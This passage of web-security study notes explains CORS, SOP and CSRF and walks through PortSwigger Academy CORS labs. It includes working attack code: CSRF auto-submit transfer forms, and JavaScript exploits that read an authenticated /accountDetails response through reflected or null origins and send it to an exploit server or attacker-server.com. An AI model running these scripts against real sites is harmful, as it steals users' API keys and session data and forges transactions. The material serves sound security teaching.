Always enumerate the exact origins that need access, including the scheme, and keep that list as small as possible. See CORS vulnerability with trusted insecure protocols.

docs.title: 4. Avoid wildcards on internal networks
docs.text: Internal applications sometimes reason "only machines on our network can reach this, so a permissive CORS policy doesn't matter." That assumption breaks down the moment any browser inside the network can also reach untrusted external sites — a single malicious or compromised external page can then pivot through the victim's browser into the internal, wildcard-trusting service.

docs.title: 5. Treat CORS as a browser-enforced relaxation, not a server-side control
docs.text:
CORS headers only change what a browser will let JavaScript read. They do nothing to stop:

  • A direct request from curl, a script, or any other HTTP client that ignores CORS.
  • A request forged by any browser from an origin that the policy happens to trust.

CORS can never replace authentication, session management, CSRF protection, or server-side authorization checks on sensitive endpoints. A properly scoped CORS policy limits which origins can read a response in a browser context; it is not what decides whether a request is allowed to happen at all.

docs.title: Checklist
docs.text:
• Access-Control-Allow-Origin lists exact, trusted origins — never a reflected or wildcarded value for endpoints returning sensitive data.
  • null is never a trusted origin.
  • Origin matching includes the scheme, not just the hostname, and does not blanket-trust every subdomain.
  • Internal services do not rely on network position in place of real authentication.
  • Sensitive actions and data remain protected by server-side authentication/authorization regardless of CORS configuration.

docs.title: The one-sentence difference
docs.text: CORS is about reading data you should not see. CSRF is about performing actions you should not perform.

docs.title: Think of them as different security guards
CORS guard: at the data door
docs.text:
• Job: “Who can read the response from our server?”
  • Question: “Can Site A read data from Site B?”
  • Analogy: A museum guard checking whether you have permission to read or view the exhibits.

docs.title: CSRF guard: at the action door
docs.text:
• Job: “Who can perform actions on our server?”
  • Question: “Can Site A make a user perform an action on Site B?”
  • Analogy: A bank teller verifying that a transaction request is actually from you.

docs.title: Example 1: Social media
docs.text:
CORS scenario:

  • You are on evil.com.
  • It tries to fetch your messages from facebook.com/api/messages.
  • CORS says: “No, evil.com cannot read Facebook's response,” unless Facebook has explicitly allowed that origin.

CSRF scenario:

  • You are on evil.com.
  • The page contains a hidden form that submits “Delete all posts” to facebook.com/delete.
  • CSRF happens: Your browser may send your Facebook cookie, and Facebook may process the action if it has no effective CSRF protection.
  • CORS does not solve this problem because the server received and processed the request; the attacker does not need to read the response for the action to cause harm.

docs.title: The request and response cycle
docs.text:
YOU on evil.com
     │
     ▼
evil.com ── [REQUEST to bank.com] ──> Bank server
     │             (with cookies)          │
     │                                     ▼
     │                              [Processes request]
     │                                     │
     │                                     ▼
     └── [RESPONSE from bank.com] <── [Sends response]
              CORS is enforced here       │
                                          │
                                  CSRF is checked here
                                  when the request arrives

Notice:

  • CSRF must be addressed when the request arrives at the server.
  • CORS controls whether browser code on the other origin can read the response.

docs.title: 1. Direction matters
docs.text:
• CORS: About the response being exposed by the server to browser code on another origin.
  • CSRF: About an unwanted request being accepted by the server.

docs.title: 2. Think “steal” versus “forge”
docs.text:
• CORS prevents: “I will read or steal data from another origin.”
  • CSRF prevents: “I will forge a request using another user's browser session.”

docs.title: 3. Ask a simple question
docs.text:
• “Who can see this data?” → Think about CORS.
  • “Who can make this request?” → Think about CSRF.

docs.title: Quick test for understanding
docs.text:
Scenario: evil.com wants to transfer money from your bank account.

What happens:

  1. evil.com makes a request to bank.com/transfer-money.
  2. Your browser automatically includes your bank cookie when the cookie rules allow it. ✅
  3. The bank receives the request with the session cookie.
  4. CSRF check: Is the request genuine and tied to user intent? A CSRF token or another defense may be required.
  5. The bank processes the transfer if its protections do not stop it.
  6. The bank sends a “Transfer successful” response.
  7. CORS check: Can evil.com read that response? Probably not unless the bank has allowed it.

Key insight: The damage can happen at step 5, before CORS controls whether the response is readable.

docs.title: The common mix-up
docs.text:
“If CORS blocks cross-origin requests, does it not block CSRF?”

No. CORS mainly controls whether browser code can read a cross-origin response. It does not replace server-side CSRF defenses for requests that the browser is allowed to send.

docs.title: The trap
docs.text:
People often think:

evil.com → bank.com = CORS blocks it

The more accurate model is:

evil.com → [request] → bank.com = the request may still be sent
bank.com → [response] → evil.com = CORS controls whether the response is readable

docs.title: Easy-to-remember chart
docs.text: Think about... CORS CSRF Problem Cross-origin data exposure Unauthorized actions When When browser code reads a response When the server receives a request Who decides The server declares allowed origins through headers, and the browser enforces the result The server validates request intent with tokens or other defenses Browser's role Enforces the CORS response-sharing rules Sends requests according to normal browser rules Analogy You cannot read someone's diary You cannot sign someone else's name Without the defense Data may leak to another origin Unwanted actions may happen With the defense Cross-origin APIs can share data intentionally Actions can be tied to the user's intent

docs.title: Final explanation
docs.text:
Imagine a house that represents a website.

CORS is like:

  • Rules about who may look through the windows and read your data.
  • Signs that say, “Only approved origins may look inside.”
  • Strangers may still be able to knock on the door and send some requests.

CSRF protection is like:

  • Rules about who may use your keys to perform actions.
  • A signature check before accepting a delivery or transaction.
  • A way to stop someone from using your authenticated browser session without your intent.

The confusion happens because both involve cross-site behavior and browser security, but one is about seeing while the other is about doing.

docs.title: Cheat sheet
docs.text:
When confused, ask:

  1. “Is this about seeing or reading data?” → CORS
  2. “Is this about making or doing something?” → CSRF

Examples:

  • “Can evil.com read my Gmail?” → CORS
  • “Can evil.com send email from my Gmail?” → CSRF

docs.title: SOP vs CSRF: Understanding Why Same-Origin Policy Does Not Prevent Cross-Site Request Forgery
Executive summary
docs.text: The Same-Origin Policy (SOP) provides no protection against Cross-Site Request Forgery (CSRF). This misunderstanding persists because both mechanisms involve cross-origin interactions, but they address different security concerns: data confidentiality under SOP versus request authenticity under CSRF.

docs.title: Core distinction
docs.text: Dimension Same-Origin Policy (SOP) Cross-Site Request Forgery (CSRF) Primary concern Data confidentiality Request authenticity Protection scope Prevents a page from reading cross-origin responses Helps prevent unauthorized state-changing actions Attack objective Information theft Action execution Defense timing When the browser controls access to a response When the server validates an incoming request Browser role Enforces cross-origin access rules Sends requests according to normal HTTP and cookie rules

docs.title: Technical analysis: why SOP fails against CSRF
1. Fundamental design purpose
docs.text:
• SOP: Created to prevent one origin from reading another origin's data.
  • CSRF: Exploits the browser's automatic credential transmission when a user is already authenticated.
  • Critical insight: SOP regulates data access, not every form of request transmission.

docs.title: 2. Cookie transmission exception
docs.text:
Cookies follow their own scope and delivery rules. When those rules allow a cookie to accompany a request, the browser may send it even when the initiating page is on a different origin.

GET /api/user-data HTTP/1.1
Host: bank.com
Cookie: session_id=abc123; user_token=xyz789
Origin: https://evil.com

The presence of an Origin header does not, by itself, make the request safe. The server must decide whether the request is authentic and authorized.

docs.title: 3. Request and response lifecycle mismatch
docs.text:
CSRF attack timeline:

[evil.com] ──(1) Forged request──> [bank.com] ──(2) Processes──> [Action executed]
                                      │
                                      ▼
                              [Sends response] ──(3)──> [evil.com]
                                                          │
                                                          ▼
                                             (4) SOP blocks reading

Key observation: The attack can succeed at step 2, while SOP only affects whether the attacking page can read the response at step 4.

docs.title: 4. Simple request vulnerability
docs.text:
Some browser requests, including form submissions and resource loads, do not require a CORS preflight. They can still cause a state-changing request to reach a server:

<!-- These can trigger requests without giving evil.com the response body. -->
<img src="https://bank.com/logout" alt="">

<form action="https://bank.com/transfer" method="POST">
  <input type="hidden" name="amount" value="10000">
  <input type="hidden" name="account" value="attacker">
</form>

<iframe src="https://bank.com/action" title=""></iframe>

The correct defense is not to rely on SOP or CORS. State-changing endpoints should validate CSRF protections and enforce the application's authentication and authorization rules.

docs.title: Browser console test cases
docs.text:
The following examples illustrate the difference in behavior. Use only against applications you own or are explicitly authorized to test.

// Test 1: SOP/CORS prevents cross-origin data reading when the target
// does not grant the page access to the response.
fetch('https://api.bank.com/balance')
  .then((response) => response.json())
  .catch((error) => console.log('Cross-origin read blocked:', error));

// Test 2: A form can submit a cross-origin state-changing request.
// This does not demonstrate a legitimate transfer; it shows why the
// server must validate CSRF protections instead of relying on SOP.
const form = document.createElement('form');
form.method = 'POST';
form.action = 'https://bank.com/transfer';
form.innerHTML = `
  <input type="hidden" name="amount" value="10000">
  <input type="hidden" name="account" value="attacker">
`;
document.body.appendChild(form);
form.submit();

docs.title: SOP security boundary
docs.text:
┌─────────────────────────────────────┐
│         Client-side boundary        │
│  Prevents: cross-origin data access │
│  Allows: some cross-origin requests │
└─────────────────────────────────────┘

docs.title: CSRF security boundary
docs.text:
┌──────────────────────────────────────┐
│         Server-side boundary          │
│  Prevents: unauthenticated actions   │
│  Requires: request validation         │
└──────────────────────────────────────┘

docs.title: Real-world attack vector
docs.text:
Scenario: A banking application has a state-changing transfer endpoint but does not validate CSRF protections.

<!-- Malicious page hosted on evil.com -->
<!DOCTYPE html>
<html>
  <body onload="document.forms[0].submit()">
    <form action="https://bank.com/api/transfer" method="POST">
      <input type="hidden" name="from" value="user_account">
      <input type="hidden" name="to" value="attacker_account">
      <input type="hidden" name="amount" value="5000">
      <input type="hidden" name="currency" value="USD">
    </form>
  </body>
</html>

Attack flow analysis:

  1. ✅ The user is authenticated with bank.com, so a session cookie is present.
  2. ✅ The user visits evil.com, where the malicious page loads.
  3. ✅ The form submits a request to bank.com.
  4. ✅ The browser may include the session cookie when cookie delivery rules allow it.
  5. ✅ The bank processes the request if it has no effective CSRF protection.
  6. ❌ SOP is irrelevant to whether the state-changing action was processed; it only affects whether the response can be read by the attacking page.

docs.title: Conclusion
docs.text:
The Same-Origin Policy and CSRF protection address different security concerns. SOP protects user data from unauthorized cross-origin reading, while CSRF defenses help ensure that state-changing actions are performed with user intent. Both are important, but neither can replace the other.

Key takeaway: SOP does not equal CSRF protection. Implement explicit CSRF defenses regardless of the application's CORS or SOP configuration.

docs.title: Same-Origin Policy (SOP)
docs.text:
• What it is: A browser security rule that prevents a website from reading resources from a different origin.
  • Why it exists: It helps stop a malicious site from stealing data from another site where you are signed in.
  • What it allows: A page may be able to send some cross-origin requests, but the browser normally prevents the page from reading the response unless the target allows it.
  • Example: Code running on example.com cannot normally read private data returned by bank.com.

docs.title: CORS (Cross-Origin Resource Sharing)
docs.text:
• What it is: A controlled way to relax parts of the Same-Origin Policy.
  • How it works: The server sends HTTP response headers that tell the browser which external origins may read a response.
  • Why it is needed: Modern applications often need a frontend, API, subdomain or trusted partner to communicate across origins.

docs.title: Key points
docs.text:
✅ CORS is not protection against CSRF attacks.

✅ CORS is a controlled way to allow cross-origin access.

✅ CORS uses HTTP headers to define trusted origins.

⚠️ A poorly configured CORS policy can create a security vulnerability.

docs.title: Common problems
docs.text:
• CORS rules that are too lenient.
  • Mistakes when validating or reflecting the Origin header.
  • Policies that effectively allow every origin to read sensitive responses.

docs.title: Simple analogy
docs.text:
• SOP: “You cannot talk to strangers.”
  • CORS: “Here is a list of approved strangers you may talk to.”
  • Bad CORS: “You may talk to anyone.” — dangerous when private information is involved.

docs.title: Takeaway
docs.text: CORS is necessary for many modern web applications, but it must be configured carefully. A poor policy can allow an attacker-controlled origin to read sensitive data across origins.

docs.title: Lab: CORS vulnerability with basic origin reflection
docs.text:
Lab context

This walkthrough describes the Web Security Academy lab shown in the supplied screenshots. Use the lab instance and exploit server assigned to your own session; the hostnames and API values are instance-specific.

This website has an insecure CORS configuration because it trusts and reflects arbitrary origins.

To solve the lab, craft JavaScript that uses CORS to retrieve the administrator's API key, upload the code to your exploit server, and deliver it to the victim. The lab is solved when you successfully submit the administrator's API key.

You can log in to your own account with:

Username: wiener
Password: peter

docs.title: Lab flow
docs.text:
1. Log in to the lab with the supplied wiener:peter credentials.
  2. Open the account page and identify the account-details request.
  3. Confirm that an attacker-controlled Origin is reflected in the CORS response.
  4. Build an exploit that sends a credentialed cross-origin request to /accountDetails.
  5. Store the exploit on the exploit server and deliver it to the victim.
  6. Read the captured response in the exploit server access log and submit the administrator's API key.

Open and zoom the screenshots

Click any screenshot to open it in a larger viewer. Use +, − or Reset to change the zoom level, use Ctrl plus the mouse wheel for fine zooming, and press Esc to close the viewer.

docs.title: Step 1: Log in to the lab
docs.text:
Open the lab URL and sign in with wiener:peter.

Figure 1. The lab login page. The authenticated session matters because the account-details endpoint returns information based on the current user's session.

After a successful login, keep the lab host separate from the exploit-server host. The lab is the target that returns the sensitive response; the exploit server is where the victim's browser will load the attacker's page.

docs.title: Step 2: Inspect the account page
docs.text:
The account page displays the logged-in username and an API key. In the normal flow, the browser obtains this information from the lab's account-details endpoint.

Figure 2. The authenticated account page. The API key is sensitive data that should not be readable by an untrusted origin.

The goal is not to attack your own account. Your account page helps establish which endpoint is worth testing and shows the type of data that the endpoint returns.

docs.title: Step 3: Confirm the CORS misconfiguration
docs.text:
Intercept the account-details request in Burp or another HTTP proxy. Send a request similar to:

GET /accountDetails HTTP/2
Host: <LAB-ID>.web-security-academy.net
Origin: evil.com
Cookie: session=<authenticated-session>

The important response headers are:

Access-Control-Allow-Origin: evil.com
Access-Control-Allow-Credentials: true
Figure 3. The vulnerable response. The server reflects the attacker-controlled Origin value and allows credentials, so browser JavaScript running on that origin can read the authenticated response.

The response body contains account data such as the username, email, API key and session information. The combination of an arbitrary reflected origin and Access-Control-Allow-Credentials: true is the central vulnerability in this lab.

docs.title: Step 4: Build the exploit script
docs.text:
The exploit uses XMLHttpRequest to request /accountDetails from the lab. withCredentials = true tells the browser to include the victim's cookies. When the response arrives, the onload handler redirects to the exploit server's /log endpoint and places the response in the query string.

The following is the script shown in the supplied code image. It requests the lab's /accountDetails endpoint with credentials and sends the response to the exploit server's relative /log path. The hostname is tied to the lab instance shown in the image; use the host from your own active lab if it differs.

<script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get', 'https://0a2500d903ede68380bc3f500035009c.web-security-academy.net/accountDetails', true);
    req.withCredentials = true;
    req.send();

    function reqListener() {
        location = '/log?key=' + this.responseText;
    };
</script>
Figure 4. The credentialed cross-origin request. The script reads the response only because the target's CORS policy permits the exploit origin to access it.

docs.title: What each important line does
docs.text:
• new XMLHttpRequest() creates a browser request object.
  • req.open(...) targets the lab's account-details endpoint.
  • req.withCredentials = true includes the victim's authenticated cookies.
  • req.onload = reqListener runs the handler after the response arrives.
  • location = '/log?key=' + this.responseText sends the response to the exploit server's access log.

docs.title: Step 5: Store and deliver the exploit
docs.text:
Open the exploit server supplied with the lab, paste the script into the response body, and save it. The exploit server page provides controls to store the response, view the exploit and deliver it to the victim.

Figure 5. The exploit server. Store the response first, then deliver the page to the victim so the victim's authenticated browser makes the credentialed request.

The victim's browser loads the exploit page from the attacker-controlled origin. The vulnerable lab responds with Access-Control-Allow-Origin matching that origin and allows credentials, so the exploit can read the account-details response. The response is then included in the request to /log.

docs.title: Step 6: Read the access log
docs.text:
Open the exploit server's access log after delivering the exploit. The log contains a request to /log?key=...; the value contains the response body returned by the lab.

Figure 6. The access log captures the victim's response. In the lab, the captured JSON contains the administrator's API key.

Find the administrator object in the logged response, copy its API key, and submit that value through the lab's Submit solution control.

docs.title: What happened in the lab?
docs.text:
The lab is vulnerable because the server treats the Origin header as trusted input instead of checking it against a fixed allowlist:

  1. The attacker hosts JavaScript on the exploit server.
  2. The victim visits that page while authenticated to the lab.
  3. The script requests /accountDetails with the victim's cookies.
  4. The lab reflects the attacker's origin and allows credentials.
  5. The browser exposes the response to the attacker's JavaScript.
  6. The script forwards the response to the exploit server's access log.
  7. The attacker reads the administrator's API key from the captured response.

This is why allowing credentials with a reflected or unrestricted origin is dangerous. The attacker does not need to guess the victim's cookie or bypass the login page; the browser supplies the authenticated context and the unsafe CORS policy exposes the response.

docs.title: Common mistakes
docs.text:
• Using the exploit-server hostname as the target instead of the lab hostname.
  • Forgetting req.withCredentials = true.
  • Requesting the wrong endpoint instead of /accountDetails.
  • Saving the script but not delivering it to the victim.
  • Looking at the lab page instead of the exploit server's access log.
  • Copying a stale API key from a previous lab instance.

docs.title: Key takeaway
docs.text: CORS is enforced by the browser, but the trust decision comes from the server's response headers. A server must never blindly reflect arbitrary origins when it also allows credentials. In this lab, that configuration turns an authenticated account-details endpoint into a cross-origin data-exfiltration path.

docs.title: Lab: CORS vulnerability with trusted insecure protocols
docs.text:
Lab: PortSwigger Web Security Academy — CORS vulnerability with trusted insecure protocols (Practitioner).

This website has an insecure CORS configuration in that it trusts all subdomains regardless of the protocol. To solve the lab, an attacker needs to exploit this and the server's trust of the stock subdomain to steal the administrator's API key.

No screenshots for this lab

The source notes for this lab contain no walkthrough screenshots, so this page summarizes the vulnerability and the general solution approach rather than reproducing a step-by-step exploit build.

docs.title: BASICS: why "any subdomain" is a weaker policy than it looks
docs.text:
A CORS allowlist is sometimes implemented as a pattern match such as *.example.com, intending to trust the organization's own sites. Two assumptions quietly creep in with that pattern:

  • Every subdomain is equally secure. If any one of them has a cross-site scripting (XSS) flaw, script running there is, by definition, running from a "trusted" origin — so it inherits whatever that origin is allowed to read via CORS.
  • The scheme doesn't matter. A regex match on the hostname alone treats http://stock.example.com the same as https://stock.example.com, even though an origin also includes the protocol. A page served over plain HTTP can be tampered with in transit by a network attacker (no TLS), or may simply be more exposed to injection bugs than the HTTPS main site.

Here the vulnerable server does both: it trusts any *.web-security-academy.net origin, over either http or https.

docs.title: The chain in this lab
docs.text:
1. CORS check: The main application's /accountDetails endpoint reflects any *.web-security-academy.net origin in Access-Control-Allow-Origin and sets Access-Control-Allow-Credentials: true, regardless of scheme.
  2. Weak sibling: The stock subdomain is served over plain http:// and reflects a request parameter into the page without encoding it — an XSS bug.
  3. Combine them: Because http://stock.LAB-ID.web-security-academy.net is a trusted CORS origin, script injected through the XSS on that subdomain can issue a credentialed cross-origin request to the main site's /accountDetails endpoint and read the response — including the logged-in administrator's API key.
  4. Exfiltrate: The injected script forwards that response to an attacker-controlled exploit server, where the attacker reads the captured API key out of the access log.

The high-level solution path mirrors the basic origin reflection lab: confirm the reflected, credentialed CORS policy on /accountDetails, find the reflected-XSS point on the trusted stock subdomain, then host a page on the exploit server that redirects the victim's browser through the XSS injection so the resulting script performs the credentialed CORS request and reports the result back.

docs.title: Why it works
docs.text:
• CORS trust decisions are made purely from the Origin header the server receives; a same-site XSS bug effectively hands an attacker a "key" to every origin the site's policy trusts.
  • Treating http:// and https:// subdomains as interchangeable ignores that they are different origins with different attack surfaces — the weakest one sets the ceiling for what the whole trust group can be used to steal.

docs.title: Remediation
docs.text:
• Never use a broad wildcard or suffix match for Access-Control-Allow-Origin; maintain an explicit allowlist of exact origins (scheme and host) that genuinely need credentialed cross-origin access.
  • Serve every trusted origin over HTTPS only, and never mix http:// and https:// within one trust boundary.
  • Fix the reflected-XSS bug on the subdomain — a safe CORS policy still should not depend on every trusted origin being free of injection bugs, but removing the XSS removes the practical exploit path.
  • Prefer same-site session handling or token-based APIs that do not rely on cross-origin, credentialed requests at all.

docs.title: Lab: CORS vulnerability with trusted null origin
docs.text:
Lab context

This walkthrough follows the trusted-null-origin lab and the six supplied screenshots. Use the lab host and exploit-server host assigned to your own session because those values are temporary and instance-specific.

This website has an insecure CORS configuration because it trusts the null origin.

To solve the lab, craft JavaScript that uses CORS to retrieve the administrator's API key, upload the code to your exploit server, and submit the recovered key. The lab is solved when the administrator's API key is accepted.

You can log in with:

Username: wiener
Password: peter

Open and zoom the screenshots

Click any screenshot to open it in the larger viewer. Use +, − or Reset to change the zoom level, use Ctrl plus the mouse wheel for fine zooming, and press Esc to close the viewer.

docs.title: Lab flow
docs.text:
1. Log in to the trusted-null-origin lab.
  2. Open the authenticated account page and identify the sensitive API key.
  3. Prepare a sandboxed iframe that creates a null origin.
  4. Request /accountDetails with the victim's credentials and pass the response to the parent page.
  5. Store and deliver the exploit from the exploit server.
  6. Read the encoded response from the access log, decode it and submit the administrator's API key.

docs.title: Step 1: Log in to the lab
docs.text:
The first screenshot shows the Web Security Academy lab titled CORS vulnerability with trusted null origin. Sign in with the supplied wiener:peter credentials.

Figure 1. The lab login page. The authenticated session is required for the later credentialed request to the account-details endpoint.

Keep the target hostname from your own browser session. Lab hostnames change between instances, so do not assume that a hostname in a screenshot will remain valid.

docs.title: Step 2: Inspect the authenticated account page
docs.text:
After logging in, open My account. The page displays the username and an API key. This is the sensitive response that the unsafe CORS configuration exposes.

Figure 2. The authenticated account page. The API key shown here belongs to the current lab account; the testing target is whether another origin can read this response.

The exploit does not bypass the login form. It relies on the victim already being authenticated so the browser can attach the session cookie to the cross-origin request.

docs.title: Step 3: Create a trusted null origin
docs.text:
A sandboxed iframe without the allow-same-origin permission receives an opaque origin. Requests made from that frame use:

Origin: null

The vulnerable server trusts this special origin. If it also allows credentials, JavaScript running inside the sandbox can read the authenticated response.

The third screenshot shows the full exploit document. It creates a sandboxed iframe, performs the credentialed request, sends the response to the parent with postMessage, and forwards the captured data to the exploit server.

Figure 3. The exploit source. The sandbox allows scripts to run but prevents the iframe from keeping the parent page's origin, producing the `null` origin used by the lab.

docs.title: The exploit script from the screenshot
docs.text:
<!DOCTYPE html>
<html>
<body>
<script>
    // Create an iframe with a sandbox to trigger a null origin.
    const iframe = document.createElement('iframe');
    iframe.sandbox = 'allow-scripts';
    iframe.srcdoc = `
        <script>
            var req = new XMLHttpRequest();
            req.onload = function() {
                // Send the response to the parent document.
                parent.postMessage(this.responseText, '*');
            };
            req.open('get', 'https://0a2500d903ede68380bc3f500035009c.web-security-academy.net/accountDetails', true);
            req.withCredentials = true;
            req.send();
        <\/script>
    `;

    // Receive the response from the sandboxed iframe.
    window.addEventListener('message', function(event) {
        // Send the captured data to the exploit server.
        fetch('https://attacker-server.com/log', {
            method: 'POST',
            body: JSON.stringify({ stolen: event.data }),
            mode: 'no-cors'
        });

        // Alternative: redirect the response to the exploit-server log.
        // location = '0afa004a0330d64780231c4800f600e8.exploit-server.net/log?key='
        //     + encodeURIComponent(event.data);
    });

    document.body.appendChild(iframe);
</script>
</body>
</html>

Replace the lab and exploit-server hostnames with the values from your own active lab. The code above preserves the values shown in the supplied screenshot.

docs.title: What the important lines do
docs.text:
• iframe.sandbox = 'allow-scripts' lets the nested code run without granting it the parent origin.
  • Omitting allow-same-origin causes the sandboxed document to use an opaque null origin.
  • req.withCredentials = true asks the browser to include the victim's authenticated session.
  • parent.postMessage(...) transfers the response from the iframe to the parent document.
  • The message handler forwards the captured response to the exploit server.

docs.title: Step 4: Store the exploit on the exploit server
docs.text:
Paste the complete HTML payload into the exploit server's response body and save it. The fourth screenshot shows the exploit-server page with the stored /exploit response and the delivery controls.

Figure 4. The exploit server. Store the payload first, then deliver it to the victim so the authenticated browser loads the sandboxed iframe.
